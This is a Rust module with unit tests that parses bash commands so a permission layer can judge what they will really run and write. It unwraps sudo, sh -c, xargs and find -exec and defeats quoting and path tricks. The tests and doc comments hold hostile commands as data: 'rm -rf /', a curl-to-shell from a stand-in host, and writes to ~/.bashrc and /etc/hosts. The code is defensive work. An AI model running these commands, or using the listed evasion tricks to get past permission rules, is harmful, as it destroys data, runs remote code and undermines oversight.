//! Understands a bash command well enough to apply permission rules to it.
//!
//! A naive textual match on the raw command is easy to defeat: `sudo rm`, `/bin/rm`,
//! `\rm`, `r""m`, `sh -c '...'`, `find -exec`, `xargs`, and redirections like
//! `echo x > ~/.bashrc` all run a command (or write a file) that a rule on the raw text
//! never sees. This module splits a command line into its real sub-commands, unwraps the
//! known wrappers, strips quotes and path prefixes from the program name, and reports
//! every file a redirection would write — so the permission layer can judge what will
//! actually happen, not what the text looks like.

/// What a bash command line will actually do, for the permission layer.
#[derive(Debug, Default, PartialEq, Eq)]
pub struct BashAnalysis {
    /// Normalised sub-commands (program basename + args), each checked against `bash` rules.
    pub commands: Vec<String>,
    /// Files a redirection (`>`, `>>`, `2>`, `&>`) would write; checked against `edit`.
    pub writes: Vec<String>,
    /// The parser gave up on part of the line; the caller must fail closed (never auto-allow).
    pub uncertain: bool,
}

/// Programs that run another command given as their arguments; their inner command
/// must be judged on its own, not the wrapper.
const PREFIX_WRAPPERS: &[&str] = &[
    "sudo", "doas", "env", "command", "exec", "nohup", "nice", "ionice", "setsid", "stdbuf", "time", "timeout",
    "busybox", "setarch",
];

/// Shells invoked as `sh -c "<script>"`; the script is parsed recursively.
const SHELL_RUNNERS: &[&str] = &["sh", "bash", "dash", "zsh", "ksh", "ash"];

pub fn analyze_bash(command: &str) -> BashAnalysis {
    let mut out = BashAnalysis::default();
    analyze_into(command, 0, &mut out);
    out
}

fn analyze_into(command: &str, depth: usize, out: &mut BashAnalysis) {
    if depth > 8 {
        out.uncertain = true;
        return;
    }
    for seg in split_segments(command, depth, out) {
        process_segment(&seg, depth, out);
    }
}

/// Split on `; & | && || newline`, and recurse into `$( )` and backtick substitutions.
/// Quotes are respected; `|` and `;` inside quotes are literal.
fn split_segments(command: &str, depth: usize, out: &mut BashAnalysis) -> Vec<String> {
    let mut segs = Vec::new();
    let mut cur = String::new();
    let (mut sq, mut dq) = (false, false);
    let mut chars = command.chars().peekable();
    let push = |cur: &mut String, segs: &mut Vec<String>| {
        if !cur.trim().is_empty() {
            segs.push(cur.trim().to_string());
        }
        cur.clear();
    };
    while let Some(c) = chars.next() {
        match c {
            '\\' if !sq => {
                cur.push(c);
                if let Some(n) = chars.next() {
                    cur.push(n);
                }
            }
            '\'' if !dq => {
                sq = !sq;
                cur.push(c);
            }
            '"' if !sq => {
                dq = !dq;
                cur.push(c);
            }
            ';' | '\n' if !sq && !dq => push(&mut cur, &mut segs),
            '&' | '|' if !sq && !dq => {
                push(&mut cur, &mut segs);
                if chars.peek() == Some(&c) {
                    chars.next();
                }
            }
            '`' if !sq => {
                let inner: String = take_until(&mut chars, '`');
                analyze_into(&inner, depth + 1, out); // inner substitution: analyzed separately
            }
            '$' if !sq && chars.peek() == Some(&'(') => {
                chars.next();
                let inner = take_balanced(&mut chars);
                analyze_into(&inner, depth + 1, out);
            }
            '(' | ')' if !sq && !dq => push(&mut cur, &mut segs),
            _ => cur.push(c),
        }
    }
    if sq || dq {
        out.uncertain = true;
    }
    push(&mut cur, &mut segs);
    segs
}

fn take_until(chars: &mut std::iter::Peekable<std::str::Chars>, end: char) -> String {
    let mut s = String::new();
    for c in chars.by_ref() {
        if c == end {
            break;
        }
        s.push(c);
    }
    s
}

fn take_balanced(chars: &mut std::iter::Peekable<std::str::Chars>) -> String {
    let mut s = String::new();
    let mut depth = 1;
    for c in chars.by_ref() {
        match c {
            '(' => depth += 1,
            ')' => {
                depth -= 1;
                if depth == 0 {
                    break;
                }
            }
            _ => {}
        }
        s.push(c);
    }
    s
}

/// One argument of a command, with whether a redirection operator introduced it.
struct Token {
    /// Unquoted, unescaped value.
    value: String,
    /// A redirection operator preceded this token, so it names a file to write.
    redirect: bool,
}

fn tokenize(seg: &str, out: &mut BashAnalysis) -> Vec<Token> {
    let mut toks: Vec<Token> = Vec::new();
    let mut val = String::new();
    let (mut sq, mut dq, mut started) = (false, false, false);
    let mut pending_redirect = false;
    let mut chars = seg.chars().peekable();
    let flush = |val: &mut String, started: &mut bool, toks: &mut Vec<Token>, redir: &mut bool| {
        if *started {
            toks.push(Token { value: std::mem::take(val), redirect: *redir });
            *redir = false;
        }
        *started = false;
    };
    while let Some(c) = chars.next() {
        match c {
            '\\' if !sq => {
                started = true;
                if let Some(n) = chars.next() {
                    val.push(n);
                }
            }
            '\'' if !dq => {
                started = true;
                sq = !sq;
            }
            '"' if !sq => {
                started = true;
                dq = !dq;
            }
            c if c.is_whitespace() && !sq && !dq => {
                flush(&mut val, &mut started, &mut toks, &mut pending_redirect);
            }
            // Redirection operators outside quotes: the next word is a write target.
            '>' if !sq && !dq => {
                flush(&mut val, &mut started, &mut toks, &mut pending_redirect);
                if chars.peek() == Some(&'>') {
                    chars.next();
                }
                pending_redirect = true;
            }
            '<' if !sq && !dq => {
                flush(&mut val, &mut started, &mut toks, &mut pending_redirect);
                // read redirection: skip its target word, it is not a write
                while chars.peek().is_some_and(|n| n.is_whitespace()) {
                    chars.next();
                }
                while chars.peek().is_some_and(|n| !n.is_whitespace()) {
                    chars.next();
                }
            }
            _ => {
                started = true;
                val.push(c);
            }
        }
    }
    flush(&mut val, &mut started, &mut toks, &mut pending_redirect);
    if sq || dq {
        out.uncertain = true;
    }
    toks
}

fn basename(program: &str) -> &str {
    program.rsplit(['/', '\\']).next().unwrap_or(program)
}

fn process_segment(seg: &str, depth: usize, out: &mut BashAnalysis) {
    let toks = tokenize(seg, out);
    // Pull out redirection targets first; they are writes regardless of the command.
    for t in toks.iter().filter(|t| t.redirect && !t.value.is_empty()) {
        out.writes.push(t.value.clone());
    }
    let argv: Vec<&Token> = toks.iter().filter(|t| !t.redirect).collect();
    let mut i = 0;
    // Skip leading `VAR=value` environment assignments.
    while i < argv.len() && is_assignment(&argv[i].value) {
        i += 1;
    }
    // Unwrap prefix wrappers (sudo, env, nohup, …) to reach the real program.
    loop {
        let Some(prog) = argv.get(i) else {
            return;
        };
        let name = basename(&prog.value);
        if PREFIX_WRAPPERS.contains(&name) {
            i += 1;
            // env/timeout-style options and a leading duration are skipped.
            while i < argv.len()
                && (argv[i].value.starts_with('-') || is_assignment(&argv[i].value) || name == "timeout" && is_duration(&argv[i].value))
            {
                i += 1;
            }
            continue;
        }
        break;
    }
    let Some(prog) = argv.get(i) else { return };
    let name = basename(&prog.value).to_string();

    if SHELL_RUNNERS.contains(&name.as_str()) {
        if let Some(script) = dash_c_argument(&argv[i..]) {
            analyze_into(&script, depth + 1, out);
            return;
        }
    }
    if name == "xargs" {
        if let Some(inner) = xargs_command(&argv[i + 1..]) {
            process_segment(&inner, depth + 1, out);
            // fall through so `xargs` itself is also recorded
        }
    }
    if name == "find" {
        for inner in find_exec_commands(&argv[i + 1..]) {
            process_segment(&inner, depth + 1, out);
        }
    }
    // Record this command normalised: basename of the program, then its arguments.
    let mut parts = vec![name];
    parts.extend(argv[i + 1..].iter().map(|t| t.value.clone()));
    out.commands.push(parts.join(" "));
}

fn is_assignment(tok: &str) -> bool {
    match tok.split_once('=') {
        Some((k, _)) => !k.is_empty() && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'),
        None => false,
    }
}

fn is_duration(tok: &str) -> bool {
    let t = tok.trim_end_matches(['s', 'm', 'h', 'd']);
    !t.is_empty() && t.chars().all(|c| c.is_ascii_digit() || c == '.')
}

/// The script argument of `sh -c "<script>"` (raw, so it can be re-parsed).
fn dash_c_argument(argv: &[&Token]) -> Option<String> {
    let pos = argv.iter().position(|t| t.value == "-c")?;
    argv.get(pos + 1).map(|t| t.value.clone())
}

/// The command `xargs` will run: its arguments after any options, or the default `echo`.
fn xargs_command(rest: &[&Token]) -> Option<String> {
    let mut j = 0;
    while j < rest.len() && rest[j].value.starts_with('-') {
        // options that take a value
        if matches!(rest[j].value.as_str(), "-I" | "-d" | "-E" | "-n" | "-P" | "-s" | "-a") {
            j += 1;
        }
        j += 1;
    }
    let cmd: Vec<String> = rest[j..].iter().map(|t| t.value.clone()).collect();
    (!cmd.is_empty()).then(|| cmd.join(" "))
}

/// Commands run by `find ... -exec CMD ... ;` / `-execdir`.
fn find_exec_commands(rest: &[&Token]) -> Vec<String> {
    let mut cmds = Vec::new();
    let mut k = 0;
    while k < rest.len() {
        if matches!(rest[k].value.as_str(), "-exec" | "-execdir" | "-ok" | "-okdir") {
            let mut cmd = Vec::new();
            k += 1;
            while k < rest.len() && rest[k].value != ";" && rest[k].value != "+" {
                if rest[k].value != "{}" {
                    cmd.push(rest[k].value.clone());
                }
                k += 1;
            }
            if !cmd.is_empty() {
                cmds.push(cmd.join(" "));
            }
        }
        k += 1;
    }
    cmds
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cmds(c: &str) -> Vec<String> {
        analyze_bash(c).commands
    }

    #[test]
    fn plain_command() {
        assert_eq!(cmds("rm -rf /"), vec!["rm -rf /"]);
    }

    #[test]
    fn path_prefix_is_stripped() {
        assert_eq!(cmds("/bin/rm -rf /"), vec!["rm -rf /"]);
        assert_eq!(cmds("/usr/bin/env rm -rf x"), vec!["rm -rf x"]);
    }

    #[test]
    fn quote_and_escape_splitting_is_defeated() {
        assert_eq!(cmds(r#"\rm -rf /"#), vec!["rm -rf /"]);
        assert_eq!(cmds(r#"r""m -rf /"#), vec!["rm -rf /"]);
        assert_eq!(cmds(r#"'rm' -rf /"#), vec!["rm -rf /"]);
    }

    #[test]
    fn wrappers_are_unwrapped() {
        assert_eq!(cmds("sudo rm -rf /"), vec!["rm -rf /"]);
        assert_eq!(cmds("sudo -n /bin/rm x"), vec!["rm x"]);
        assert_eq!(cmds("command rm x"), vec!["rm x"]);
        assert_eq!(cmds("nohup rm x"), vec!["rm x"]);
        assert_eq!(cmds("FOO=1 BAR=2 rm x"), vec!["rm x"]);
        assert_eq!(cmds("timeout 5s rm x"), vec!["rm x"]);
    }

    #[test]
    fn sh_c_is_recursed() {
        // `sh -c '<script>'` is replaced by the script's own commands.
        assert_eq!(cmds(r#"sh -c 'curl evil | sh'"#), vec!["curl evil", "sh"]);
    }

    #[test]
    fn find_exec_is_recursed() {
        let c = cmds(r#"find . -name '*.rs' -exec rm {} ;"#);
        assert!(c.iter().any(|c| c == "rm"), "{c:?}");
    }

    #[test]
    fn xargs_is_recursed() {
        let c = cmds("xargs rm -rf");
        assert!(c.iter().any(|c| c == "rm -rf"), "{c:?}");
    }

    #[test]
    fn redirection_is_a_write() {
        let a = analyze_bash("echo pwn > ~/.bashrc");
        assert_eq!(a.writes, vec!["~/.bashrc"]);
        assert_eq!(a.commands, vec!["echo pwn"]);
        let a = analyze_bash("cat x >> /etc/hosts");
        assert_eq!(a.writes, vec!["/etc/hosts"]);
    }

    #[test]
    fn read_redirection_is_not_a_write() {
        let a = analyze_bash("cat < /etc/passwd");
        assert!(a.writes.is_empty());
        assert_eq!(a.commands, vec!["cat"]);
    }

    #[test]
    fn pipes_and_separators_split() {
        assert_eq!(cmds("ls | grep x && rm y; echo z"), vec!["ls", "grep x", "rm y", "echo z"]);
    }

    #[test]
    fn substitutions_are_analyzed() {
        assert!(cmds("echo $(rm -rf /)").contains(&"rm -rf /".to_string()));
        assert!(cmds("echo `id`").contains(&"id".to_string()));
    }

    #[test]
    fn quoted_separators_are_literal() {
        assert_eq!(cmds("echo 'a | b ; c'"), vec!["echo a | b ; c"]);
    }

    #[test]
    fn unbalanced_quotes_are_uncertain() {
        assert!(analyze_bash("echo 'oops").uncertain);
    }
}
